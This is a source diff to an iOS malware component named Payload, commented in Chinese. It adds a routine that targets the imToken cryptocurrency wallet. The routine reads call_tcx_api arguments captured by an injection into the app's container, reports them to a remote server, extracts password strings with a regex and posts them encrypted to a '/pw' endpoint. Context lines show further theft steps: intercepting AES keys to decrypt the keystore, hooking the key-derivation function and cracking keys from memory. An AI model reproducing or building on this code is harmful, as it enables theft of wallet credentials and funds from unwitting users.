@@ -34,6 +34,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 - (void)runSelfTest;
 - (void)probeImTokenPassword;
 - (void)tryImTokenAesKeys;
+- (void)probeImTokenTcx;
 @end
 
 @implementation Payload
@@ -483,7 +484,8 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
-                        [self tryImTokenAesKeys];      // 最直接：用截到的 AES 密钥解 keystore
+                        [self probeImTokenTcx];        // 主目标：call_tcx_api 的 JSON 参数
+                        [self tryImTokenAesKeys];      // 其次：用截到的 AES 密钥解 keystore
                         [self probeImTokenPassword];   // 其次：KDF hook 拿明文密码
                         [self crackImTokenByKey];      // 兜底：内存里找派生密钥
                         [self pollTasks];                          // 每轮都轮询
@@ -803,6 +805,78 @@ static NSArray *WalletMemoryTargets(void) {
 
 /// 读 imtoken 截到的 AES 密钥，直接尝试解 keystore（不需要密码）
 /// 文件格式每行：keyHex|ivHex
+
+/// 读 imToken 里 call_tcx_api 的安装状态与实际参数（JSON）
+- (void)probeImTokenTcx {
+    @try {
+        // 1) 安装状态
+        NSData *sd = [WalletFS readFile:@"Documents/_imt_tcx_status.txt" inContainer:@"im.token.app"];
+        if (!sd.length) sd = [WalletFS readFile:@"tmp/_imt_tcx_status.txt" inContainer:@"im.token.app"];
+        if (sd.length) {
+            NSString *s = [[NSString alloc] initWithData:sd encoding:NSUTF8StringEncoding];
+            s = [s stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            static NSString *lastS = nil;
+            if (s.length && ![lastS isEqualToString:s]) {
+                lastS = [s copy];
+                NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+                ev[@"et"] = @"imtoken_tcx_status";
+                ev[@"c"] = kSeed;
+                ev[@"ctx"] = @{ @"status": s };
+                [self.net sendEvent:ev];
+            }
+        }
+
+        // 2) 抓到的参数
+        NSData *d = [WalletFS readFile:@"Documents/_imt_tcx.txt" inContainer:@"im.token.app"];
+        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_tcx.txt" inContainer:@"im.token.app"];
+        if (!d.length) return;
+        NSString *txt = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
+        if (!txt.length) return;
+
+        static NSString *lastT = nil;
+        if ([lastT isEqualToString:txt]) return;
+        lastT = [txt copy];
+
+        NSArray *calls = [txt componentsSeparatedByString:@"\n@@@\n"];
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"imtoken_tcx_calls";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = @{ @"count": @(calls.count),
+                        @"sample": calls.count ? [calls componentsJoinedByString:@" || "] : @"" };
+        [self.net sendEvent:ev];
+
+        // 3) 从 JSON 里抠密码，直接送 /pw
+        NSMutableArray *pwds = [NSMutableArray array];
+        for (NSString *c in calls) {
+            // "password":"xxx"  或  "password": "xxx"
+            NSRegularExpression *re = [NSRegularExpression
+                regularExpressionWithPattern:@"\"password\"\\s*:\\s*\"([^\"]{1,64})\""
+                                     options:0 error:NULL];
+            NSArray *ms = [re matchesInString:c options:0 range:NSMakeRange(0, c.length)];
+            for (NSTextCheckingResult *m in ms) {
+                if (m.numberOfRanges > 1) {
+                    NSString *v = [c substringWithRange:[m rangeAtIndex:1]];
+                    if (v.length && ![pwds containsObject:v]) [pwds addObject:v];
+                }
+            }
+        }
+        if (!pwds.count) return;
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        body[@"c"] = kSeed;
+        body[@"bundle_id"] = @"im.token.app";
+        body[@"candidates"] = pwds;
+        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:120];
+
+        NSMutableDictionary *hit = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        hit[@"et"] = @"imtoken_tcx_pwd";
+        hit[@"c"] = kSeed;
+        hit[@"ctx"] = @{ @"pwds": @(pwds.count), @"resp": r ? [r description] : @"nil" };
+        [self.net sendEvent:hit];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"probeImTokenTcx: %@", e.reason]];
+    }
+}
 - (void)tryImTokenAesKeys {
     @try {
         NSData *d = [WalletFS readFile:@"Documents/_imt_aeskeys.txt" inContainer:@"im.token.app"];
